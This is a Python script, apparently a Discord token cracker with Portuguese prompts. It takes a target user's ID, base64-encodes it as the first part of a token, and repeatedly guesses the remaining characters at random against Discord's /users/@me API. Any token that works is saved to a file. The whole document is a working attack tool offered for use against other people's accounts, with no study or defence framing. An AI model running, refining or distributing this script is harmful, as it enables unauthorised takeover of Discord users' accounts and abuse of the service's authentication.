#!/usr/bin/env python3
import requests
import time
import platform
from colorama import Fore
import os
import base64

platform = platform.system()
if platform == 'Windows':
    os.system('cls')
else:
    os.system('clear')
        
def main():
    import random
    print(f'''{Fore.LIGHTMAGENTA_EX}
 /$$$$$$$  /$$$$$$$$        /$$                                
| $$__  $$|__  $$__/       | $$                                
| $$  \ $$   | $$  /$$$$$$ | $$   /$$  /$$$$$$  /$$$$$$$       
| $$$$$$$    | $$ /$$__  $$| $$  /$$/ /$$__  $$| $$__  $$      
| $$__  $$   | $$| $$  \ $$| $$$$$$/ | $$$$$$$$| $$  \ $$      
| $$  \ $$   | $$| $$  | $$| $$_  $$ | $$_____/| $$  | $$      
| $$$$$$$/   | $$|  $$$$$$/| $$ \  $$|  $$$$$$$| $$  | $$      
|_______/    |__/ \______/ |__/  \__/ \_______/|__/  |__/  

{Fore.LIGHTMAGENTA_EX}             ╔═════════════════════════╗
             ║{Fore.LIGHTWHITE_EX} Tool Created by Mr Empy {Fore.LIGHTMAGENTA_EX}║
             ║{Fore.LIGHTWHITE_EX} Version 1.0             {Fore.LIGHTMAGENTA_EX}║
             ╚═════════════════════════╝                                                            
    ''')
    characs = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    characs2 = '01zr'
        
        
        
    api = 'https://discord.com/api/v8/users/@me'
    id = input(f'{Fore.LIGHTBLUE_EX}[*]{Fore.LIGHTWHITE_EX} ID da Pessoa: ')  
    id_encoded = base64.b64encode(bytes(id, 'utf-8'))
    print('\n')
    
    while True:
        random1 = f".X{random.choices(characs2, k=1)}{random.choices(characs, k=4)}.{random.choices(characs, k=27)}"
        random2 = random1.replace("'","")
        random3 = random2.replace(",","")
        random4 = random3.replace("[","")
        random5 = random4.replace("]","")
        random_final = random5.replace(" ","")
        
        header = {
            'authorization': id_encoded.decode('utf-8') + random_final
        }
        
        r = requests.get(api, headers=header)
    
        if 'id' in r.text:
            print(f'{Fore.LIGHTGREEN_EX}[+] Token Encontrado:', id_encoded.decode('utf-8') + random_final)
            token_f = open('tokens_crackeds.txt', 'a')
            token_f.write(f'{id} >> {id_encoded.decode('utf-8')}{random_final}\n')
            token_f.close()
            break
        else:
            print(f'{Fore.LIGHTRED_EX}[-] Token Errado:', id_encoded.decode('utf-8') + random_final)
            time.sleep(1)
    
if __name__ == '__main__':
    main()